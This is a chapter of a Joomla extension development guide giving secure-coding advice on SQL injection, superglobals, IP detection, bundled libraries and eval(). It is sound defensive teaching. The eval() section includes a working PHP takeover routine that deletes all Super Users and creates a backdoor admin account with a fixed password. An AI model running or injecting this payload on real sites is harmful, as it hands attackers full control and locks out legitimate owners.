<html><head>
      <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
   <title>4.&nbsp;Write code which doesn't suck</title><link rel="stylesheet" type="text/css" href="html.css"><meta name="generator" content="DocBook XSL Stylesheets V1.79.1"><link rel="home" href="index.html" title="Joomla Extensions Development"><link rel="up" href="ch01.html" title="Chapter&nbsp;1.&nbsp;Introduction"><link rel="prev" href="ch01s03.html" title="3.&nbsp;New Joomla 4 features at a glance"><link rel="next" href="ch02.html" title="Chapter&nbsp;2.&nbsp;Basic concepts"></head><body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF"><div class="navheader"><table width="100%" summary="Navigation header"><tr><th colspan="3" align="center">4.&nbsp;Write code which doesn't suck</th></tr><tr><td width="20%" align="left"><a accesskey="p" href="ch01s03.html"><img src="images/prev.svg" alt="Prev"></a>&nbsp;</td><th width="60%" align="center">Chapter&nbsp;1.&nbsp;Introduction</th><td width="20%" align="right">&nbsp;<a accesskey="n" href="ch02.html"><img src="images/next.svg" alt="Next"></a></td></tr></table><hr></div><div class="section"><div class="titlepage"><div><div><h2 class="title" style="clear: both"><a name="intro-write-code-dont-suck"></a>4.&nbsp;Write code which doesn't suck</h2></div></div></div><p>Having audited several dozens of sites with hundreds of extensions I have seen the same old problems appearing in the code of extension after extension. Not only they are security incidents waiting to happen, they also make migrating your code to newer Joomla versions harder and break your extension in said Joomla versions.</p><div class="section"><div class="titlepage"><div><div><h3 class="title"><a name="intro-dont-suck-hardcoded-queries"></a>4.1.&nbsp;DON'T: Hard-coded database queries</h3></div></div></div><p>I have seen bad code like this:</p><pre class="programlisting">$query = 'SELECT `something` FROM `#__whatever` WHERE `id` = ' . $db-&gt;quote($id);</pre><p>It's even worse with there is no <code class="code">$db-&gt;quote</code> at all because that ensures it's a SQL injection waiting to happen.</p><p>Having a hard-coded database query is really bad because you are making an assumption the site runs under MySQL and that the escape character is the backtick. This is not a guarantee. Moreover, are you absolutely sure that you have not missed an escape in a long SQL query? Would you bet your and your clients' sites' security, as well as the possibility of massive fines due to GDPR if you have failed miserably, on your ability to not miss anything?</p><p>Let's get real. Joomla has offered a database query builders since version 1.6 (released in 2010) and improved it in Joomla 4.</p><p>Here's the simplest way to write the above code:</p><pre class="programlisting">$query = $db-&gt;getQuery(true)
  -&gt;select($db-&gt;quoteName('something'))
  -&gt;from($db-&gt;quoteName('#__whatever'))
  -&gt;where($db-&gt;quoteName('id') . ' = ' . $db-&gt;quote($id));</pre><p>This is still not a very good approach because <code class="code">$id</code> may look like a numeric string but actually be a hidden SQL Injection. Therefore a better way to write this query is using prepared statements which send the raw value of $id to the server and tell it what data type it is (boolean, null, blob, string or integer). The value is not interpolated into the query itself, making it perfectly safe against SQL injection attacks.</p><pre class="programlisting">$query = $db-&gt;getQuery(true)
  -&gt;select($db-&gt;quoteName('something'))
  -&gt;from($db-&gt;quoteName('#__whatever'))
  -&gt;where($db-&gt;quoteName('id') . ' = :id')
  -&gt;bind(':id', $id, \Joomla\Database\ParameterType::INTEGER);</pre><div class="note"><table border="0" summary="Note"><tr><td rowspan="2" align="center" valign="top" width="25"><img alt="[Note]" src="images/note.svg"></td><th align="left"></th></tr><tr><td align="left" valign="top"><p>Prepared statements are only meant to be used when you have data coming from a variable. If you have hard-coded data you can still interpolate them after passing them through <code class="code">$db-&gt;quote()</code>.</p><p>Also note that any data &#8212;even data coming from another query which ostensibly only includes &#8220;safe&#8221;, hard-coded data you have inserted yourself in the database&#8212; MUST go through prepared statements. Anything which is not hard-coded in the code currently executing must be assumed to be potentially dangerous. Even data you inserted in the database and the user cannot modify through the interface <span class="emphasis"><em>can</em></span> be modified by a malicious actor, e.g. using a SQL injection vulnerability in another extension.</p><p><span class="bold"><strong>TRUST NO-ONE, NOT EVEN YOURSELF.</strong></span></p><p>That's the motto of the security conscious developer.</p></td></tr></table></div></div><div class="section"><div class="titlepage"><div><div><h3 class="title"><a name="intro-dont-suck-superglobals"></a>4.2.&nbsp;DON'T: Using superglobalg ($_REQUEST, $_SERVER, $_GET, $_POST etc)</h3></div></div></div><p>Another very common problem I have seen in Joomla extensions is developers doing something like this:</p><pre class="programlisting">$something = $_REQUEST['something'];
// or, worse, this
$whatever = $_SERVER['WHATEVER'];</pre><p><span class="bold"><strong>DO NOT DO THAT. THIS IS A SECURITY ISSUE.</strong></span> There are very few cases where an extension needs access to the raw PHP superglobals, namely if you are writing a security extension and you need to check whether there's potentially malicious data in the request before Joomla sanitizes it. If you are one of the five or so people in the Joomla world writing this kind of software you are unlikely to be reading this. If you are about to say that you have a different, legitimate use case: you do NOT; you just don't know how to use Joomla's input class. Sorry.</p><p>Joomla already provides an Input class which can return the <span class="emphasis"><em>filtered and sanitised</em></span> values of a request or environment parameter. Moreover, it allows other parts of your code and plugins to modify or override the input parameters.</p><p>The correct way to get something would be something like this:</p><pre class="programlisting">$something = \Joomla\CMS\Factory::getApplication()-&gt;input-&gt;request-&gt;getCmd('something', 'default');</pre><p>If the object you are working with has its own input property use that instead of the global input object shown above. Dispatchers and Controllers do have their own input object which can of course be overridden during instantiation.</p><p>If the object you are working with has its own property which gives you access to the application use that instead of going through the CMS Factory. This makes your code reusable and testable across applications.</p><p>Do NOT get input variables from your Model or View classes. Your Controller should be the only point where you use the input object to retrieve input parameters. You can pass these values to your model by setting its <span class="emphasis"><em>state</em></span>. Likewise, your view should only ever read the model's state, not the input directly. This makes your code reusable and testable. It also lets you make changes in the naming of your input parameters only making a change in your controller (and possibly your dispatcher) instead of trying to hunt down random uses spread throughout your code. It also makes you think about the data flow in your application which makes it infinitely easier to debug it.</p><p>You should not use the entire request superglobal (e.g. <code class="code">$this-&gt;input-&gt;getCmd('something')</code> or <code class="code">$this-&gt;input-&gt;request-&gt;getCmd('something')</code>) if you know that a specific piece of data can only come as GET or POST data. Instead, be specific, e.g. <code class="code">$this-&gt;input-&gt;get-&gt;getCmd('something')</code> for GET data and <code class="code">$this-&gt;input-&gt;post-&gt;getCmd('something')</code> for POST data. This prevents <span class="emphasis"><em>input shading</em></span>. If the same input is present in $_GET, $_POST, $_ENV, $_COOKIE and $_SERVER you will only get one value in the request. Which one? It depends on the PHP configuration (<code class="code">request_order</code> and <code class="code">variables_order</code> configuration keys). While on <span class="emphasis"><em>most</em></span> servers it's GP (Get and Post, i.e. POST data overrides GET data) it could actually be anything with unpredictable consequences for your extension. For example, some servers may stupidly include cookies in request_order, thereby allowing a hacker to set a cookie on a victim's browser to make your extension do something other than the user's reasonable expectation, e.g. delete or modify a different record than what they were trying to delete / edit.</p><p>Do not assume that the data you get from the input object is of a specific scalar type. For example, <code class="code">$this-&gt;input-&gt;getInt('something')</code> may return an integer, null (the default value) or <span class="emphasis"><em>an array of integers</em></span>. The latter is something that you are unlikely to have come across but that's the way the <code class="code">get()</code> method of Joomla's input object works. Always check the type of the data you receive, always assume that there is a hacker trying to inject invalid data trying to trip your code up, always assume that any kind of filtering or sanitization may fail to work the way you assume it works.</p><p>If you want to access the $_SERVER and $_ENV superglobals; don't. Instead go through <code class="code">$this-&gt;input-&gt;server</code> and <code class="code">$this-&gt;input-&gt;env</code>. For example, if I want to get the contents of the HTTP header X-Foo-Bar I should do <code class="code">$this-&gt;input-&gt;server-&gt;getString('HTTP_X_FOO_BAR');</code>.</p><p>Remember that Joomla can and will apply its text filters when you use <code class="code">getString</code>. If you want to get the raw data use <code class="methodname">getRaw</code> or <code class="methodname">getArray</code> &#8212; neither method applies any filtering.</p><p>Even though you can access the $_FILES superglobal with the input object &#8212; <span class="bold"><strong>DO NOT DO THAT</strong></span>! You should never handle file uploads directly in your code. Always go through Joomla's <code class="methodname">\Joomla\CMS\Filesystem\File::upload()</code> method. Do remember that, by default, it will try to prevent unsafe files from being uploaded. If you have a VERY good reason to allow &#8220;unsafe&#8221; files (e.g. you expect that a ZIP file containing PHP files will be used with your extension) and have taken responsible measures to prevent security issues you can of course set its <code class="code">$allowUnsafe</code> parameter to <code class="code">true</code>. If you need your extension to allow uploading of files with extensions or MIME types which are not media you can of course use custom file upload configuration in your own extension. This means that the excuse you may have had for using $_FILES directly is completely invalid so please don't let me see you ever accessing superglobals again.</p></div><div class="section"><div class="titlepage"><div><div><h3 class="title"><a name="intro-dont-suck-remote-addr"></a>4.3.&nbsp;DON'T: Using REMOTE_ADDR to get the user's IP</h3></div></div></div><p>It is very common for extensions to need access to the user's IP address. I see extensions doing silly things like this:</p><pre class="programlisting">$ip = $_SERVER['REMOTE_ADDR'];
$ip = $this-&gt;input-&gt;server-&gt;get('REMOTE_ADDR');</pre><p><span class="bold"><strong>DO NOT DO THAT; THIS IS WRONG ON MANY LEVELS!</strong></span></p><p>The first line tries to access the $_SERVER superglobal which, as mentioned in the previous section, is a security issue waiting to happen.</p><p>Both of these lines make a wrong assumption: that the REMOTE_ADDR key of the server superglobal array will contain the user's IP address. This is not true if the server is behind a load balancer, CDN, firewall or any other kind of non-transparent proxy. In these cases a different HTTP header &#8212;typically X-Forwarded-For&#8212; may be used to convey the forwarding chain of IP addresses. However, you should NOT attempt to read this header yourself for two reasons. First of all, if the site is not behind a non-transparent proxy a malicious actor can send a forged X-Forwarded-For header to trick your extension into believing the request came from a different IP address than the one it actually originates. Second, this header may contain more than one IP addresses in a comma-separated list. Validating, sanitizing and parsing that list is tricky and may lead to some very bad times and security issues.</p><p>Joomla 3.10 and later (including all 4.x releases and beyond) include a fork of my IPHelper class which deals with all of these details automatically. They also expose user-facing options in the Global Configuration so that the site owner can inform Joomla whether their site is behind a non-transparent proxy server.</p><p>You can get the real IP address of the user with this:</p><pre class="programlisting">$ip = \Joomla\Utilities\IpHelper::getIp();</pre><p>Even better, going through the IpHelper makes your code <span class="bold"><strong>testable</strong></span>. Your unit tests can simply call:</p><pre class="programlisting">\Joomla\Utilities\IpHelper::setIp('1.2.3.4');</pre><p>to set a fake IP address of your choice (IPv4 or IPv6).</p><p>Finally, IpHelper has two more handy methods: <code class="methodname">isIPv6</code> which tells you if you are dealing with an IPv6 address and <code class="methodname">IPinList</code> which lets you figure out if an IP address is contained in an array which consists of any combination of IPv4/IPv6 addresses, IPv4 ranges (e.g. 1.2.3.4-1.2.3.255), IPv4/IPv6 subnets in CIDR notation (e.g. 1.2.3.4/24) or IPv4 subnets in IP/Netmask notation (e.g. 192.168.1.0/255.255.255.0). Since many use cases for getting the user's IP address ultimately come down to checking if it belongs in a range of IP addresses or a list of allowed/blocked IP addresses you'll find the latter method extremely handy. I went through the pain of figuring out IP address maths and Joomla included my work in the core so you don't have to deal with it yourself!</p></div><div class="section"><div class="titlepage"><div><div><h3 class="title"><a name="intro-dont-suck-duplicate-libraries"></a>4.4.&nbsp;DON'T: Include duplicate copies of libraries shipped with Joomla itself</h3></div></div></div><p>A few weeks ago I was troubleshooting a client's Joomla 3 site and I noticed that there were six extensions which in total included four copies of TCPDF, six copies of SimplePie and four copies of PHPMailer. All these libraries are already shipped with Joomla itself.</p><p>Do NOT include copies of libraries already included in Joomla with your software. If you absolutely have to &#8212;because you need a newer version than what Joomla provides&#8212; <span class="bold"><strong>DO NOT USE THE SAME NAMESPACE AND CLASS NAMES</strong></span>. It will break Joomla or third party extensions when your code is loaded.</p><p>In fact, even if you are including third libraries which are not included in Joomla you should be doing one of the following:</p><div class="itemizedlist"><ul class="itemizedlist" style="list-style-type: disc; "><li class="listitem"><p>Do NOT load third party libraries except in a component's model which is never going to be used outside of your component.</p></li><li class="listitem"><p>Change the namespace of your third party libraries using Rector.</p></li></ul></div><p>The first method is not a fool-proof way to go about it. The third party library you are using may be included in Joomla or a different third party extension (worst case scenario: a system plugin which always loads this library) therefore causing your own code to break. This happened to me when I contributed the WebAuthn code to Joomla 4, thereby breaking my Login with Apple plugin which was using a newer version of one of the libraries used by the WebAuthn code. Oops.</p><p>Changing the namespace of your dependencies with Rector is fairly trivial and guarantees that any third party libraries you include in your code will neither interfere with core or third party code, nor will they be interfered with by core or third party code. It's one more (small and simple) step building your extensions but it can make a massively positive difference to your clients who construct their sites out of prepackaged, mass-distributed code they can't (and usually don't even know how to) modify.</p></div><div class="section"><div class="titlepage"><div><div><h3 class="title"><a name="intro-dont-suck-evil-eval"></a>4.5.&nbsp;DON'T: Using <code class="code">eval()</code></h3></div></div></div><p>Let me start by saying that allowing users to enter arbitrary PHP code which will be executed by the site is a <span class="bold"><strong>VERY BAD IDEA</strong></span>. It is very easy for anyone with minimal developer experience &#8212;or someone following a how-to hacking guide&#8212; to take over a site. The following took me 5' to write and it's a complete takeover of a site:</p><div class="caution"><table border="0" summary="Caution"><tr><td rowspan="2" align="center" valign="top" width="25"><img alt="[Caution]" src="images/caution.svg"></td><th align="left"></th></tr><tr><td align="left" valign="top"><p><span class="bold"><strong>DO NOT TRY THIS ON YOUR SITE!</strong></span></p><p>The following code deletes all Super Users and adds a new Super User. This is detrimental to your site. It's only meant to demonstrate how easily a site can be taken over if a developer allows arbitrary PHP execution.</p></td></tr></table></div><pre class="programlisting">function hackMePlenty()
{
	$user = \Joomla\CMS\Factory::getContainer()
		-&gt;get(\Joomla\CMS\User\UserFactoryInterface::class)
		-&gt;loadUserByUsername('drevil1234');

	if ($user-&gt;username === 'drevil1234') return;

	$db    = \Joomla\CMS\Factory::getContainer()-&gt;get('DatabaseDriver')
	$query = $db-&gt;getQuery(true)
		-&gt;select([$db-&gt;quoteName('id')])
		-&gt;from($db-&gt;quoteName('#__usergroups'));

	$superUserGroups = array_filter(
		$db-&gt;setQuery($query)-&gt;loadColumn(0) ?: [],
		function ($group) {
			return \Joomla\CMS\Access\Access::checkGroup($group, 'core.admin');
		}
	);

	$existingSuperUsers = array_unique(
		array_reduce(
			$superUserGroups,
			function (array $carry, int $groupId) {
				return array_merge($carry, \Joomla\CMS\Access\Access::getUsersByGroup($groupId));
			},
			[]
		)
	);

	if (!empty($existingSuperUsers))
	{
		$query = $db-&gt;getQuery(true)
			-&gt;delete($db-&gt;quoteName('#__users'))
			-&gt;whereIn($db-&gt;quoteName('id'), $existingSuperUsers);
		$db-&gt;setQuery($query)-&gt;execute();
	}

	$user = new \Joomla\CMS\Table\User($db);
	$user-&gt;save([
		'name' =&gt; 'Evil Hacker',
		'username' =&gt; 'drevil1234',
		'email' =&gt; 'drevil@example.com',
		'password' =&gt; \Joomla\CMS\User\UserHelper::hashPassword('Dr3v!L0wnzJ00'),
		'block' =&gt; 0,
		'sendEmail' =&gt; 1,
		'registerDate' =&gt; (new \Joomla\CMS\Date\Date('2004-08-08 01:02:03'))-&gt;toSql(),
		'lastVisitDate' =&gt; (new \Joomla\CMS\Date\Date())-&gt;toSql(),
		'activation' =&gt; '',
		'groups' =&gt; $superUserGroups
	]);
}

try { hackMePlenty(); } catch (\Throwable $e) { }</pre><p>For this reason, whenever I see an extension which deliberately allows PHP code to be inserted and executed I am worried. If I see this being allowed in an editor or other text entry field without checking that the data comes from a Super User I am immediately labelling the extension a massive security issue and the site compromised unless proven differently.</p><p>As a developer you should NEVER, EVER have a feature which allows direct PHP execution. This includes this happening unintentionally by using the evil <code class="code">eval()</code>.  Also note that most hosts disable <code class="code">eval()</code> so idiot developers won't create backdoors the size of Alaska on the sites hosted on that host.</p><p>There are very few cases where you might want to evaluate <span class="emphasis"><em>generated</em></span> (as opposed to <span class="emphasis"><em>user defined</em></span>) PHP code. For example, when I implemented a subset of the Blade template language in FOF I was converting Blade files to straight up PHP. Of course, I could not run the generated code through <code class="code">eval()</code>. The solution to that is to first try to create a temporary file &#8212;either in Joomla's temporary directory or a cache directory&#8212; and <code class="code">include()</code> it. If the temporary directory is unwriteable you can use <code class="code">class_exists(\Joomla\Filesystem\Buffer::class, true);</code> which includes Joomla's buffer class. This registers the stream handler <code class="code">buffer://</code> which creates a filesystem in memory. You can write to a file in it, e.g. <code class="code">file_put_contents('buffer://foobar.php', $theContents);</code> and then include it like this <code class="code">include('buffer://foobar.php');</code>. The downside with the buffer method is that on some hosts with hardened PHP runtimes you cannot include executable files from stream wrappers which have not been explicitly allowed by the server administrator. Hence the need to go through the filesystem first.</p><p>As I said, you should only ever evaluate PHP code in your extensions if you have written it or if your own code has generated it. <span class="bold"><strong>DO NOT TRUST THE USER &#8212;NOT EVEN SUPER USERS&#8212; TO PROVIDE EXECUTABLE PHP CODE THEMSELVES; IT IS A MASSIVE SECURITY ISSUE</strong></span>. Do you hear that, form component developers? Your extensions make it trivial to hack people's sites. Fix 'em!</p></div></div><div class="navfooter"><hr><table width="100%" summary="Navigation footer"><tr><td width="40%" align="left"><a accesskey="p" href="ch01s03.html"><img src="images/prev.svg" alt="Prev"></a>&nbsp;</td><td width="20%" align="center"><a accesskey="u" href="ch01.html"><img src="images/up.svg" alt="Up"></a></td><td width="40%" align="right">&nbsp;<a accesskey="n" href="ch02.html"><img src="images/next.svg" alt="Next"></a></td></tr><tr><td width="40%" align="left" valign="top">3.&nbsp;New Joomla 4 features at a glance&nbsp;</td><td width="20%" align="center"><a accesskey="h" href="index.html"><img src="images/home.svg" alt="Home"></a></td><td width="40%" align="right" valign="top">&nbsp;Chapter&nbsp;2.&nbsp;Basic concepts</td></tr></table></div></body></html>